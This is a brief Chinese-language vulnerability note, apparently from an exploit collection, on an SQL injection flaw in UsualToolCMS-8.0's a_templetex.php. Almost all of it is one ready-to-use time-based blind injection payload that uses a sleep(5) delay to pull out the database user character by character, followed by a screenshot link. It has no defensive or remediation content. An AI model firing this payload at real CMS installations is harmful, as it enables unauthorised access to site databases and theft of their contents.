
# UsualToolCMS-8.0 a_templetex.php sql注入漏洞

payload:

```
a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+
```

![image.png](.resource/UsualToolCMS-8.0%20a_templetex.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/1600850751098-fc38e94b-e10c-4844-bf78-9162a9fccd47.png)

